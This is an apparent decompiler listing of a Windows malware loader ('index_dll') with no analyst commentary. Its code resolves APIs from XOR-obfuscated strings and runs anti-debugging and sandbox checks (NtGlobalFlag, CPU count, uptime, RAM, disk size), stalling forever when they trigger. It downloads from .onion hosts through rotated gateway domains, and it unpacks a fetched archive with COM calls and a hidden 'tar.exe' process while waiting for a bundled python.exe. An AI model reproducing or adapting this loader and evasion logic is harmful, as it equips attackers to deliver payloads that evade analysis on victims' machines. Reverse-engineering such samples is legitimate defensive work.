/* Hex-Rays decompilation of index_dll */

// ----- nullsub_1 @ 0x401000 -----
void nullsub_1()
{
  ;
}


// ----- start @ 0x4013f0 -----
int __usercall start@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>, int a4@<esi>, char a5)
{
  PVOID StackBase; // ebx
  signed __int32 v6; // eax
  int v7; // esi
  int result; // eax
  BOOL v9; // eax
  __int16 v10; // cx
  int v11; // ebx
  _DWORD *v12; // eax
  int v13; // edx
  int v14; // edi
  const void *Src; // edx
  size_t Size; // esi
  void *v17; // eax
  int v18; // [esp+24h] [ebp-3Ch]
  int v19; // [esp+28h] [ebp-38h]
  int v20; // [esp+2Ch] [ebp-34h]
  _DWORD *v21; // [esp+2Ch] [ebp-34h]
  int v22; // [esp+2Ch] [ebp-34h]
  _DWORD v23[9]; // [esp+3Ch] [ebp-24h] BYREF
  _UNKNOWN *retaddr; // [esp+60h] [ebp+0h]

  dword_7B2070 = 1;
  v23[8] = retaddr;
  v23[7] = a2;
  v23[6] = a3;
  v23[5] = a4;
  v23[4] = a1;
  v23[3] = &a5;
  StackBase = NtCurrentTeb()->NtTib.StackBase;
  while ( 1 )
  {
    v6 = _InterlockedCompareExchange(&dword_7B204C, (signed __int32)StackBase, 0);
    if ( v6 == 0 )
    {
      v7 = 0;
      goto LABEL_6;
    }
    if ( StackBase == (PVOID)v6 )
      break;
    Sleep(0x3E8u);
  }
  v7 = 1;
LABEL_6:
  if ( dword_7B2050 == 1 )
  {
    result = amsg_exit(31);
    goto LABEL_46;
  }
  if ( dword_7B2050 != 0 )
  {
    dword_7B2004 = 1;
  }
  else
  {
    dword_7B2050 = 1;
    sub_404060();
    dword_7B2088 = (int)SetUnhandledExceptionFilter(TopLevelExceptionFilter);
    sub_40AAE0(nullsub_1);
    sub_404860();
    v9 = false;
    dword_7B2064 = 1;
    dword_7B2060 = 1;
    dword_7B205C = 1;
    if ( MEMORY[0x400000] == 23117 && *(_DWORD *)(MEMORY[0x40003C] + 0x400000) == 17744 )
    {
      v10 = *(_WORD *)(MEMORY[0x40003C] + 4194328);
      if ( v10 == 267 )
      {
        if ( *(_DWORD *)(MEMORY[0x40003C] + 4194420) > 0xEu )
          v9 = *(_DWORD *)(MEMORY[0x40003C] + 4194536) != 0;
      }
      else if ( v10 == 523 && *(_DWORD *)(MEMORY[0x40003C] + 4194436) > 0xEu )
      {
        v9 = *(_DWORD *)(MEMORY[0x40003C] + 4194552) != 0;
      }
    }
    dword_7B2008 = v9;
    if ( dword_7B2070 != 0 )
      _set_app_type(_crt_gui_app);
    else
      _set_app_type(_crt_console_app);
    *_p__fmode() = dword_7B2084;
    *_p__commode() = dword_7B206C;
    if ( sub_403D40() < 0 )
      goto LABEL_37;
    if ( dword_7AC094 == 1 )
      sub_404400(sub_403E30);
    if ( dword_7AC08C == -1 )
      sub_40AAF0(-1);
    v11 = sub_40AA10(&unk_7AF494, &unk_7AF498);
    if ( v11 != 0 )
      return 255;
    v23[0] = dword_7B2058;
    if ( (int)sub_40AA50(&dword_7B2014, &dword_7B2010, &dword_7B200C, dword_7B2054, v23) < 0
      || (v20 = dword_7B2014, v12 = malloc(4 * dword_7B2014 + 4), v13 = (int)v12, v12 == nullptr) )
    {
LABEL_37:
      result = amsg_exit(8);
      goto LABEL_38;
    }
    if ( v20 > 0 )
    {
      v19 = v20;
      v14 = dword_7B2010;
      v18 = v7;
      v21 = v12;
      do
      {
        Size = strlen(*(const char **)(v14 + 4 * v11)) + 1;
        v17 = malloc(Size);
        v21[v11] = v17;
        if ( v17 == nullptr )
          goto LABEL_37;
        Src = *(const void **)(v14 + 4 * v11++);
        memcpy(v17, Src, Size);
      }
      while ( v19 != v11 );
      v13 = (int)v21;
      v7 = v18;
      v12 = &v21[v19];
    }
    *v12 = 0;
    dword_7B2010 = v13;
    initterm((_PVFV *)&First, (_PVFV *)&Last);
    sub_403D20();
    dword_7B2050 = 2;
  }
  if ( v7 == 0 )
    _InterlockedExchange(&dword_7B204C, 0);
  if ( TlsCallback_0 != nullptr )
    TlsCallback_0(0, 2, 0);
  *(_DWORD *)_p___initenv() = dword_7B200C;
  result = sub_40AC80(dword_7B2014);
  if ( dword_7B2008 == 0 )
LABEL_46:
    exit(result);
  if ( dword_7B2004 == 0 )
  {
LABEL_38:
    v22 = result;
    cexit();
    return v22;
  }
  return result;
}


// ----- j_atexit @ 0x401410 -----
// attributes: thunk
int __cdecl j_atexit(void (__cdecl *a1)())
{
  return atexit(a1);
}


// ----- sub_4014C0 @ 0x4014c0 -----
HMODULE sub_4014C0()
{
  HMODULE result; // eax

  if ( dword_40B000 != nullptr )
    dword_40B000(&unk_7B00D8);
  result = hLibModule;
  if ( hLibModule != nullptr )
    return (HMODULE)FreeLibrary(hLibModule);
  return result;
}


// ----- sub_4014F0 @ 0x4014f0 -----
int __cdecl sub_4014F0(int a1, int a2, char a3, int a4)
{
  int i; // [esp+10h] [ebp-4h]

  for ( i = 0; i < a2; ++i )
    *(_BYTE *)(a4 + i) = a3 ^ *(_BYTE *)(i + a1);
  *(_BYTE *)(a2 + a4) = 0;
  return a2 + a4;
}


// ----- sub_40153B @ 0x40153b -----
FARPROC __cdecl sub_40153B(int a1, int a2, int a3, int a4, char a5)
{
  CHAR ProcName[64]; // [esp+24h] [ebp-94h] BYREF
  CHAR ModuleName[64]; // [esp+64h] [ebp-54h] BYREF
  int v8; // [esp+A4h] [ebp-14h]
  HMODULE hModule; // [esp+A8h] [ebp-10h]
  int i; // [esp+ACh] [ebp-Ch]

  for ( i = 0; i < a2 && i <= 62; ++i )
    ModuleName[i] = a5 ^ *(_BYTE *)(i + a1);
  ModuleName[i] = 0;
  for ( i = 0; i < a4 && i <= 62; ++i )
    ProcName[i] = a5 ^ *(_BYTE *)(i + a3);
  ProcName[i] = 0;
  hModule = GetModuleHandleA(ModuleName);
  if ( hModule == nullptr )
    hModule = LoadLibraryA(ModuleName);
  v8 = 0;
  if ( hModule != nullptr )
    return GetProcAddress(hModule, ProcName);
  return (FARPROC)v8;
}


// ----- sub_401630 @ 0x401630 -----
WCHAR *__cdecl sub_401630(LPCCH lpMultiByteStr)
{
  WCHAR *lpWideCharStr; // [esp+28h] [ebp-10h]
  int cchWideChar; // [esp+2Ch] [ebp-Ch]

  cchWideChar = MultiByteToWideChar(0, 0, lpMultiByteStr, -1, nullptr, 0);
  if ( cchWideChar <= 0 )
    return nullptr;
  lpWideCharStr = (WCHAR *)malloc(2 * cchWideChar);
  if ( lpWideCharStr == nullptr )
    return nullptr;
  MultiByteToWideChar(0, 0, lpMultiByteStr, -1, lpWideCharStr, cchWideChar);
  return lpWideCharStr;
}


// ----- sub_4016D6 @ 0x4016d6 -----
VARIANTARG *__cdecl sub_4016D6(VARIANTARG *a1, int a2, LPCCH a3, int a4)
{
  _DWORD v5[4]; // [esp+48h] [ebp-38h] BYREF
  int v6; // [esp+58h] [ebp-28h] BYREF
  void *Block; // [esp+5Ch] [ebp-24h] BYREF
  VARIANTARG pvarg; // [esp+60h] [ebp-20h] BYREF
  int v9; // [esp+74h] [ebp-Ch]

  VariantInit(&pvarg);
  if ( a2 != 0 )
  {
    Block = sub_401630(a3);
    if ( Block != nullptr )
    {
      v9 = (*(int (__stdcall **)(int, void *, void **, int, int, int *))(*(_DWORD *)a2 + 20))(
             a2,
             &unk_7AD050,
             &Block,
             1,
             1024,
             &v6);
      free(Block);
      if ( v9 >= 0 )
      {
        v5[0] = a4;
        v5[1] = 0;
        v5[2] = 1;
        v5[3] = 0;
        (*(void (__stdcall **)(int, int, void *, int, int, _DWORD *, VARIANTARG *, _DWORD, _DWORD))(*(_DWORD *)a2 + 24))(
          a2,
          v6,
          &unk_7AD050,
          1024,
          3,
          v5,
          &pvarg,
          0,
          0);
      }
      *a1 = pvarg;
    }
    else
    {
      *a1 = pvarg;
    }
  }
  else
  {
    *a1 = pvarg;
  }
  return a1;
}


// ----- sub_40183B @ 0x40183b -----
VARIANTARG *__cdecl sub_40183B(VARIANTARG *a1, int a2, LPCCH a3)
{
  _DWORD v4[4]; // [esp+48h] [ebp-38h] BYREF
  int v5; // [esp+58h] [ebp-28h] BYREF
  void *Block; // [esp+5Ch] [ebp-24h] BYREF
  VARIANTARG pvarg; // [esp+60h] [ebp-20h] BYREF
  int v8; // [esp+74h] [ebp-Ch]

  VariantInit(&pvarg);
  if ( a2 != 0 )
  {
    Block = sub_401630(a3);
    if ( Block != nullptr )
    {
      v8 = (*(int (__stdcall **)(int, void *, void **, int, int, int *))(*(_DWORD *)a2 + 20))(
             a2,
             &unk_7AD050,
             &Block,
             1,
             1024,
             &v5);
      free(Block);
      if ( v8 >= 0 )
      {
        memset(v4, 0, sizeof(v4));
        (*(void (__stdcall **)(int, int, void *, int, int, _DWORD *, VARIANTARG *, _DWORD, _DWORD))(*(_DWORD *)a2 + 24))(
          a2,
          v5,
          &unk_7AD050,
          1024,
          3,
          v4,
          &pvarg,
          0,
          0);
      }
      *a1 = pvarg;
    }
    else
    {
      *a1 = pvarg;
    }
  }
  else
  {
    *a1 = pvarg;
  }
  return a1;
}


// ----- sub_4019A1 @ 0x4019a1 -----
void __cdecl sub_4019A1(int a1, LPCCH a2, _DWORD *a3, _DWORD *a4)
{
  _DWORD v4[4]; // [esp+48h] [ebp-48h] BYREF
  _DWORD v5[9]; // [esp+58h] [ebp-38h] BYREF
  int v6; // [esp+7Ch] [ebp-14h] BYREF
  void *Block; // [esp+80h] [ebp-10h] BYREF
  int v8; // [esp+84h] [ebp-Ch]

  if ( a1 != 0 )
  {
    Block = sub_401630(a2);
    if ( Block != nullptr )
    {
      v8 = (*(int (__stdcall **)(int, void *, void **, int, int, int *))(*(_DWORD *)a1 + 20))(
             a1,
             &unk_7AD050,
             &Block,
             1,
             1024,
             &v6);
      free(Block);
      if ( v8 >= 0 )
      {
        v5[0] = *a4;
        v5[1] = a4[1];
        v5[2] = a4[2];
        v5[3] = a4[3];
        v5[4] = *a3;
        v5[5] = a3[1];
        v5[6] = a3[2];
        v5[7] = a3[3];
        v4[0] = v5;
        v4[1] = 0;
        v4[2] = 2;
        v4[3] = 0;
        (*(void (__stdcall **)(int, int, void *, int, int, _DWORD *, _DWORD, _DWORD, _DWORD))(*(_DWORD *)a1 + 24))(
          a1,
          v6,
          &unk_7AD050,
          1024,
          1,
          v4,
          0,
          0,
          0);
      }
    }
  }
}


// ----- sub_401F89 @ 0x401f89 -----
char *__cdecl sub_401F89(const char *Str)
{
  char *result; // eax
  char v2; // [esp+1Bh] [ebp-Dh]

  for ( result = strstr(Str, ".onion"); result != nullptr; result = strstr(result + 6, ".onion") )
  {
    v2 = result[6];
    if ( v2 == 47 || v2 == 58 || v2 == 0 || v2 == 63 )
      return result;
  }
  return nullptr;
}


// ----- sub_401FE7 @ 0x401fe7 -----
int __cdecl sub_401FE7(const char *Str, LPCSTR lpFileName)
{
  size_t v3; // ebx
  size_t Size; // [esp+8h] [ebp-460h]
  size_t Sizea; // [esp+8h] [ebp-460h]
  char Destination[1024]; // [esp+18h] [ebp-450h] BYREF
  char *Source[5]; // [esp+418h] [ebp-50h]
  char v8[5]; // [esp+42Eh] [ebp-3Ah] BYREF
  void *v9; // [esp+433h] [ebp-35h] BYREF
  char v10[5]; // [esp+437h] [ebp-31h] BYREF
  void *v11; // [esp+43Ch] [ebp-2Ch] BYREF
  void *v12; // [esp+440h] [ebp-28h] BYREF
  char *v13; // [esp+444h] [ebp-24h]
  int v14; // [esp+448h] [ebp-20h]
  char *v15; // [esp+44Ch] [ebp-1Ch]
  size_t v16; // [esp+450h] [ebp-18h]
  int v17; // [esp+454h] [ebp-14h]
  char *v18; // [esp+458h] [ebp-10h]
  int i; // [esp+45Ch] [ebp-Ch]

  v18 = sub_401F89(Str);
  if ( v18 == nullptr )
    return sub_401AC6((int)Str, lpFileName, Size);
  v12 = &unk_73772E;
  v11 = &unk_796C2E;
  strcpy(v10, ".pet");
  v9 = &unk_68732E;
  strcpy(v8, ".moe");
  Source[0] = (char *)&v12;
  Source[1] = (char *)&v11;
  Source[2] = v10;
  Source[3] = (char *)&v9;
  Source[4] = v8;
  v17 = 5;
  for ( i = 4; i > 0; --i )
  {
    v14 = rand() % (i + 1);
    v13 = Source[v14];
    Source[v14] = Source[i];
    Source[i] = v13;
  }
  v16 = v18 - Str + 6;
  v15 = v18 + 6;
  for ( i = 0; i < v17; ++i )
  {
    v3 = strlen(Source[i]) + v16;
    if ( (int)(v3 + strlen(v15)) <= 1023 )
    {
      memcpy(Destination, Str, v16);
      Destination[v16] = 0;
      strcat(Destination, Source[i]);
      strcat(Destination, v15);
      if ( sub_401AC6((int)Destination, lpFileName, Sizea) != 0 )
        return 1;
    }
  }
  return 0;
}


// ----- sub_402193 @ 0x402193 -----
int __cdecl sub_402193(LPCCH a1, LPCCH a2)
{
  LONG lVal; // eax
  LONG v4; // eax
  LONG v5; // eax
  CHAR FileName[260]; // [esp+64h] [ebp-248h] BYREF
  MSG Msg; // [esp+168h] [ebp-144h] BYREF
  CHAR v8[16]; // [esp+184h] [ebp-128h] BYREF
  VARIANTARG v9; // [esp+194h] [ebp-118h] BYREF
  VARIANTARG v10; // [esp+1A4h] [ebp-108h] BYREF
  VARIANTARG v11; // [esp+1B4h] [ebp-F8h] BYREF
  CHAR v12[16]; // [esp+1C4h] [ebp-E8h] BYREF
  VARIANTARG v13; // [esp+1D4h] [ebp-D8h] BYREF
  VARIANTARG v14; // [esp+1E4h] [ebp-C8h] BYREF
  CHAR v15[16]; // [esp+1F4h] [ebp-B8h] BYREF
  VARIANTARG v16; // [esp+204h] [ebp-A8h] BYREF
  VARIANTARG pvarg; // [esp+214h] [ebp-98h] BYREF
  CHAR v18[16]; // [esp+228h] [ebp-84h] BYREF
  CHAR v19[32]; // [esp+238h] [ebp-74h] BYREF
  int v20; // [esp+258h] [ebp-54h] BYREF
  LONG v21; // [esp+25Ch] [ebp-50h]
  int v22; // [esp+260h] [ebp-4Ch]
  int v23; // [esp+264h] [ebp-48h]
  LONG v24; // [esp+268h] [ebp-44h]
  LONG v25; // [esp+26Ch] [ebp-40h]
  FARPROC v26; // [esp+270h] [ebp-3Ch]
  FARPROC v27; // [esp+274h] [ebp-38h]
  FARPROC v28; // [esp+278h] [ebp-34h]
  void *v29; // [esp+27Ch] [ebp-30h]
  void *v30; // [esp+280h] [ebp-2Ch]
  void *Block; // [esp+284h] [ebp-28h]
  int v32; // [esp+288h] [ebp-24h]
  FARPROC v33; // [esp+28Ch] [ebp-20h]
  FARPROC v34; // [esp+290h] [ebp-1Ch]
  void (*v35)(void); // [esp+294h] [ebp-18h]
  FARPROC v36; // [esp+298h] [ebp-14h]
  int i; // [esp+29Ch] [ebp-10h]
  int v38; // [esp+2A0h] [ebp-Ch]

  v36 = sub_40153B((int)&unk_7ABE10, dword_7ABE1C, (int)&unk_7ABE98, dword_7ABEA4, -45);
  v35 = (void (*)(void))sub_40153B((int)&unk_7ABE10, dword_7ABE1C, (int)&unk_7ABEA8, dword_7ABEB8, -45);
  v34 = sub_40153B((int)&unk_7ABE10, dword_7ABE1C, (int)&unk_7ABEBC, dword_7ABECC, -45);
  v33 = sub_40153B((int)&unk_7ABE10, dword_7ABE1C, (int)&unk_7ABED0, dword_7ABEE0, -45);
  if ( v36 == nullptr || v35 == nullptr || v34 == nullptr || v33 == nullptr )
    return 0;
  v32 = ((int (__stdcall *)(_DWORD))v36)(0);
  if ( v32 < 0 )
    return 0;
  v38 = 0;
  v20 = 0;
  sub_4014F0((int)&unk_7ABFCC, dword_7ABFE0, -45, (int)v19);
  Block = sub_401630(v19);
  if ( Block != nullptr )
  {
    v32 = ((int (__stdcall *)(void *, CHAR *))v34)(Block, v18);
    free(Block);
    if ( v32 >= 0 )
    {
      v32 = ((int (__stdcall *)(CHAR *, _DWORD, int, void *, int *))v33)(v18, 0, 1, &unk_7AE4A0, &v20);
      if ( v32 >= 0 && v20 != 0 )
      {
        v30 = sub_401630(a1);
        v29 = sub_401630(a2);
        if ( v30 != nullptr
          && v29 != nullptr
          && (v28 = sub_40153B((int)&unk_7ABE20, dword_7ABE2C, (int)&unk_7ABF04, dword_7ABF14, -45),
              v27 = sub_40153B((int)&unk_7ABE20, dword_7ABE2C, (int)&unk_7ABF18, dword_7ABF28, -45),
              v26 = sub_40153B((int)&unk_7ABE20, dword_7ABE2C, (int)&unk_7ABEF4, dword_7ABF00, -45),
              v28 != nullptr)
          && v27 != nullptr
          && v26 != nullptr )
        {
          v25 = ((int (__stdcall *)(void *))v28)(v30);
          v24 = ((int (__stdcall *)(void *))v28)(v29);
          free(v30);
          free(v29);
          if ( v25 != 0 && v24 != 0 )
          {
            VariantInit(&pvarg);
            pvarg.vt = 8;
            pvarg.lVal = v25;
            VariantInit(&v16);
            v16.vt = 8;
            v16.lVal = v24;
            sub_4014F0((int)&unk_7ABFE4, dword_7ABFF0, -45, (int)v15);
            sub_4016D6(&v14, v20, v15, (int)&pvarg);
            sub_4016D6(&v13, v20, v15, (int)&v16);
            ((void (__stdcall *)(LONG))v27)(v25);
            ((void (__stdcall *)(LONG))v27)(v24);
            if ( v14.vt == 9 )
              lVal = v14.lVal;
            else
              lVal = 0;
            v23 = lVal;
            if ( v13.vt == 9 )
              v4 = v13.lVal;
            else
              v4 = 0;
            v22 = v4;
            if ( v23 != 0 && v22 != 0 )
            {
              sub_4014F0((int)&unk_7AC000, dword_7AC008, -45, (int)v12);
              sub_40183B(&v11, v23, v12);
              v5 = v11.vt == 9 ? v11.lVal : 0;
              v21 = v5;
              if ( v5 != 0 )
              {
                VariantInit(&v10);
                v10.vt = 9;
                v10.lVal = v21;
                VariantInit(&v9);
                v9.vt = 3;
                v9.lVal = 1044;
                sub_4014F0((int)&unk_7ABFF4, dword_7ABFFC, -45, (int)v8);
                sub_4019A1(v22, v8, &v10, &v9);
                sub_404CA0(FileName, 260, "%s\\python.exe", a2);
                for ( i = 0; i <= 119; ++i )
                {
                  while ( PeekMessageA(&Msg, nullptr, 0, 0, 1u) )
                  {
                    TranslateMessage(&Msg);
                    DispatchMessageA(&Msg);
                  }
                  if ( GetFileAttributesA(FileName) != -1 )
                  {
                    v38 = 1;
                    break;
                  }
                  Sleep(0x1F4u);
                }
                (*(void (__stdcall **)(LONG))(*(_DWORD *)v21 + 8))(v21);
                ((void (__stdcall *)(VARIANTARG *))v26)(&v11);
              }
            }
            if ( v23 != 0 )
            {
              (*(void (__stdcall **)(int))(*(_DWORD *)v23 + 8))(v23);
              ((void (__stdcall *)(VARIANTARG *))v26)(&v14);
            }
            if ( v22 != 0 )
            {
              (*(void (__stdcall **)(int))(*(_DWORD *)v22 + 8))(v22);
              ((void (__stdcall *)(VARIANTARG *))v26)(&v13);
            }
          }
          else
          {
            ((void (__stdcall *)(LONG))v27)(v25);
            ((void (__stdcall *)(LONG))v27)(v24);
          }
        }
        else
        {
          free(v30);
          free(v29);
        }
      }
      if ( v20 != 0 )
        (*(void (__stdcall **)(int))(*(_DWORD *)v20 + 8))(v20);
      v35();
      return v38;
    }
    else
    {
      v35();
      return 0;
    }
  }
  else
  {
    v35();
    return 0;
  }
}


// ----- sub_40288F @ 0x40288f -----
BOOL __cdecl sub_40288F(const char *a1, const char *a2, int a3)
{
  DWORD ExitCode; // [esp+60h] [ebp-370h] BYREF
  HANDLE hProcess[4]; // [esp+64h] [ebp-36Ch] BYREF
  _DWORD v6[17]; // [esp+74h] [ebp-35Ch] BYREF
  _BYTE v7[780]; // [esp+B8h] [ebp-318h] BYREF
  FARPROC v8; // [esp+3C4h] [ebp-Ch]

  sub_404CA0(v7, 780, "tar.exe -xf \"%s\" -C \"%s\"", a1, a2);
  memset(v6, 0, sizeof(v6));
  v6[0] = 68;
  memset(hProcess, 0, sizeof(hProcess));
  v8 = sub_40153B((int)&unk_7ABDE0, dword_7ABDEC, (int)&unk_7ABF2C, dword_7ABF3C, -45);
  if ( v8 == nullptr )
    return false;
  if ( ((int (__stdcall *)(_DWORD, _BYTE *, _DWORD, _DWORD, _DWORD, int, _DWORD, int, _DWORD *, HANDLE *))v8)(
         0,
         v7,
         0,
         0,
         0,
         0x8000000,
         0,
         a3,
         v6,
         hProcess) == 0 )
    return false;
  WaitForSingleObject(hProcess[0], 0xEA60u);
  ExitCode = 1;
  GetExitCodeProcess(hProcess[0], &ExitCode);
  CloseHandle(hProcess[0]);
  CloseHandle(hProcess[1]);
  return ExitCode == 0;
}


// ----- sub_402A2B @ 0x402a2b -----
BOOL sub_402A2B()
{
  HANDLE hProcess; // eax
  BOOL Wow64Process; // [esp+1Ch] [ebp-Ch] BYREF

  Wow64Process = false;
  hProcess = GetCurrentProcess();
  IsWow64Process(hProcess, &Wow64Process);
  return Wow64Process;
}


// ----- sub_402A58 @ 0x402a58 -----
void sub_402A58()
{
  double v0; // st7
  _DWORD v1[2]; // [esp+48h] [ebp-90h] BYREF
  unsigned __int64 v2; // [esp+50h] [ebp-88h]
  unsigned int v3; // [esp+5Ch] [ebp-7Ch]
  _BYTE v4[8]; // [esp+88h] [ebp-50h] BYREF
  __int64 v5; // [esp+90h] [ebp-48h] BYREF
  _BYTE v6[8]; // [esp+98h] [ebp-40h] BYREF
  int v7; // [esp+A0h] [ebp-38h]
  struct _PEB *v8; // [esp+A4h] [ebp-34h]
  int v9; // [esp+A8h] [ebp-30h]
  DWORD TickCount; // [esp+ACh] [ebp-2Ch]
  double v11; // [esp+B0h] [ebp-28h]
  FARPROC v12; // [esp+B8h] [ebp-20h]
  FARPROC v13; // [esp+BCh] [ebp-1Ch]
  __int64 (*v14)(void); // [esp+C0h] [ebp-18h]
  FARPROC v15; // [esp+C4h] [ebp-14h]
  unsigned int NtGlobalFlag; // [esp+C8h] [ebp-10h]
  int (*v17)(void); // [esp+CCh] [ebp-Ch]

  v17 = sub_40153B((int)&unk_7ABDE0, dword_7ABDEC, (int)&unk_7ABF40, dword_7ABF54, -45);
  if ( v17 != nullptr && v17() != 0 || (v9 = 48, v8 = NtCurrentPeb(), ((NtGlobalFlag = v8->NtGlobalFlag) & 0x70) != 0) )
  {
    Sleep(0xFFFFFFFF);
  }
  else
  {
    v15 = sub_40153B((int)&unk_7ABDE0, dword_7ABDEC, (int)&unk_7ABF74, dword_7ABF84, -45);
    if ( v15 != nullptr )
    {
      ((void (__stdcall *)(_DWORD *))v15)(v1);
      if ( v3 <= 1 )
        goto LABEL_18;
    }
    v14 = (__int64 (*)(void))sub_40153B((int)&unk_7ABDE0, dword_7ABDEC, (int)&unk_7ABF88, dword_7ABF98, -45);
    if ( v14 != nullptr && (unsigned __int64)v14() <= 0x493DF )
      goto LABEL_18;
    v13 = sub_40153B((int)&unk_7ABDE0, dword_7ABDEC, (int)&unk_7ABF9C, dword_7ABFB0, -45);
    if ( v13 != nullptr )
    {
      v1[0] = 64;
      if ( ((int (__stdcall *)(_DWORD *))v13)(v1) != 0 && v2 <= 0x5FFFFFFF )
        goto LABEL_18;
    }
    v12 = sub_40153B((int)&unk_7ABDE0, dword_7ABDEC, (int)&unk_7ABFB4, dword_7ABFC8, -45);
    if ( v12 == nullptr || ((int (__stdcall *)(const char *, _BYTE *, __int64 *, _BYTE *))v12)("C:\\", v6, &v5, v4) == 0 )
      goto LABEL_19;
    v0 = (double)v5;
    if ( v5 < 0 )
      v0 = v0 + -0.0;
    v11 = v0 / 1073741824.0;
    if ( v11 < 50.0 )
    {
LABEL_18:
      Sleep(0xFFFFFFFF);
    }
    else
    {
LABEL_19:
      TickCount = GetTickCount();
      v7 = 0;
      while ( GetTickCount() - TickCount <= 0xF9F )
      {
        ++v7;
        Sleep(0x64u);
      }
    }
  }
}


// ----- sub_403C4B @ 0x403c4b -----
int __stdcall sub_403C4B(int a1, int a2, int a3, int a4)
{
  void *v5; // [esp+0h] [ebp-8h]
  int v6; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h]

  sub_402D4E(v5, v6, savedregs);
  return 0;
}


// ----- sub_403C60 @ 0x403c60 -----
void __cdecl sub_403C60()
{
  void (*i)(void); // eax

  for ( i = *(void (**)(void))off_7AC080; i != nullptr; off_7AC080 = (_UNKNOWN *)((char *)off_7AC080 + 4) )
  {
    i();
    i = *((void (**)(void))off_7AC080 + 1);
  }
}


// ----- sub_403CB0 @ 0x403cb0 -----
int sub_403CB0()
{
  int v0; // ebx
  int v2; // eax

  v2 = 0;
  do
    v0 = v2++;
  while ( dword_7AF478[v2] != 0 );
  for ( ; v0 != 0; --v0 )
    ((void (*)(void))dword_7AF478[v0])();
  return j_atexit(sub_403C60);
}


// ----- sub_403D20 @ 0x403d20 -----
int sub_403D20()
{
  int result; // eax

  result = dword_7B2048;
  if ( dword_7B2048 == 0 )
  {
    dword_7B2048 = 1;
    return sub_403CB0();
  }
  return result;
}


// ----- sub_403D40 @ 0x403d40 -----
int sub_403D40()
{
  return 0;
}


// ----- TlsCallback_1 @ 0x403d50 -----
int __stdcall TlsCallback_1(int a1, int a2, int a3)
{
  int result; // eax

  result = a2;
  if ( a2 == 3 || a2 == 0 )
    return sub_404750(a1, a2);
  return result;
}


// ----- TlsCallback_0 @ 0x403d90 -----
int __stdcall TlsCallback_0(int a1, int a2, int a3)
{
  int result; // eax

  result = a2;
  if ( dword_7AC090 != 2 )
    dword_7AC090 = 2;
  if ( a2 == 1 )
    return sub_404750(a1, 1);
  return result;
}


// ----- sub_403E20 @ 0x403e20 -----
int sub_403E20()
{
  return 0;
}


// ----- sub_403E30 @ 0x403e30 -----
int __cdecl sub_403E30(int a1)
{
  const char *v1; // ebx
  unsigned int v2; // edx
  const char *v3; // esi
  FILE *Stream; // eax
  double v6; // [esp+38h] [ebp-20h]
  double v7; // [esp+40h] [ebp-18h]
  double v8; // [esp+48h] [ebp-10h]

  v1 = "Unknown error";
  v2 = *(_DWORD *)a1 - 1;
  if ( v2 <= 5 )
    v1 = off_7AD27C[v2];
  v3 = *(const char **)(a1 + 4);
  v6 = *(double *)(a1 + 24);
  v7 = *(double *)(a1 + 16);
  v8 = *(double *)(a1 + 8);
  Stream = (FILE *)sub_40AB10(2);
  fprintf(Stream, "_matherr(): %s in %s(%g, %g)  (retval=%g)\n", v1, v3, v8, v7, v6);
  return 0;
}


// ----- sub_403EB0 @ 0x403eb0 -----
void __noreturn sub_403EB0(char *Format, ...)
{
  FILE *Stream; // eax
  FILE *v2; // eax
  va_list va; // [esp+24h] [ebp+Ch] BYREF

  va_start(va, Format);
  Stream = (FILE *)sub_40AB10(2);
  fprintf(Stream, "Mingw-w64 runtime failure:\n");
  v2 = (FILE *)sub_40AB10(2);
  vfprintf(v2, Format, va);
  abort();
}


// ----- sub_403F00 @ 0x403f00 -----
_DWORD *__usercall sub_403F00@<eax>(const void *a1@<eax>)
{
  int v2; // ebx
  int v3; // ecx
  _DWORD *result; // eax
  int v5; // edi
  int v6; // ebx
  _DWORD *v7; // eax
  const void *lpAddress; // eax
  DWORD v9; // eax
  SIZE_T RegionSize; // ecx
  PVOID BaseAddress; // edx
  DWORD *lpflOldProtect; // ebx
  DWORD LastError; // eax
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+14h] [ebp-34h] BYREF

  v2 = dword_7B2078;
  if ( dword_7B2078 <= 0 )
  {
    v2 = 0;
LABEL_6:
    v5 = sub_404990(a1);
    if ( v5 == 0 )
      sub_403EB0("Address %p has no image-section", a1);
    v6 = 20 * v2;
    v7 = (_DWORD *)(v6 + dword_7B207C);
    v7[4] = v5;
    *v7 = 0;
    lpAddress = (const void *)(*(_DWORD *)(v5 + 12) + sub_404AD0());
    *(_DWORD *)(dword_7B207C + v6 + 12) = lpAddress;
    if ( VirtualQuery(lpAddress, &Buffer, 0x1Cu) == 0 )
      sub_403EB0(
        "  VirtualQuery failed for %d bytes at address %p",
        *(_DWORD *)(v5 + 8),
        *(const void **)(dword_7B207C + v6 + 12));
    result = (_DWORD *)Buffer.Protect;
    if ( ((Buffer.Protect - 4) & 0xFFFFFFFB) != 0 && ((Buffer.Protect - 64) & 0xFFFFFFBF) != 0 )
    {
      v9 = 64;
      RegionSize = Buffer.RegionSize;
      if ( Buffer.Protect == 2 )
        v9 = 4;
      BaseAddress = Buffer.BaseAddress;
      lpflOldProtect = (DWORD *)(dword_7B207C + v6);
      lpflOldProtect[2] = Buffer.RegionSize;
      lpflOldProtect[1] = (DWORD)BaseAddress;
      result = (_DWORD *)VirtualProtect(BaseAddress, RegionSize, v9, lpflOldProtect);
      if ( result == nullptr )
      {
        LastError = GetLastError();
        sub_403EB0("  VirtualProtect failed with code 0x%x", LastError);
      }
    }
    ++dword_7B2078;
  }
  else
  {
    v3 = 0;
    result = (_DWORD *)(dword_7B207C + 12);
    while ( (unsigned int)a1 < *result || (unsigned int)a1 >= *(_DWORD *)(result[1] + 8) + *result )
    {
      ++v3;
      result += 5;
      if ( v3 == dword_7B2078 )
        goto LABEL_6;
    }
  }
  return result;
}


// ----- sub_404060 @ 0x404060 -----
void sub_404060()
{
  void *v0; // esp
  int v1; // [esp+20h] [ebp-38h] BYREF

  if ( dword_7B2074 == 0 )
  {
    dword_7B2074 = 1;
    sub_404A10();
    v0 = alloca(sub_404C70());
    dword_7B2078 = 0;
    dword_7B207C = (int)&v1;
  }
}


// ----- sub_4043B0 @ 0x4043b0 -----
int (__cdecl *__cdecl sub_4043B0(int a1, int a2, double a3, double a4, double a5))(_DWORD)
{
  int (__cdecl *result)(_DWORD); // eax
  _DWORD v6[2]; // [esp+10h] [ebp-28h] BYREF
  double v7; // [esp+18h] [ebp-20h]
  double v8; // [esp+20h] [ebp-18h]
  double v9; // [esp+28h] [ebp-10h]

  result = dword_7B2080;
  if ( dword_7B2080 != nullptr )
  {
    v7 = a3;
    v8 = a4;
